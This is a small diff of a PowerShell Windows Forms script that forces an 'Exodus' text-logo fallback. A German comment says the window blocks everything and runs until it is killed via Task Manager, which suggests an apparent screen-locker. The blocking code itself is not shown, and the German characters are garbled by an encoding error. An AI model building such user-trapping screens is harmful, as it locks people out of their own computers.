@@ -19,7 +19,7 @@ $pictureBox.Dock = "Top"
 $pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2
 
 $gifPath = ""
-if (Test-Path $gifPath) {
+if ($false) {
     $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
 } else {
     # Fallback: groÃŸes Exodus-Text-Logo
@@ -148,3 +148,4 @@ $timer.Start()
 # Blockiert alles – lÃ¤uft ewig oder bis Task-Manager
 
 $form.ShowDialog() | Out-Null
+
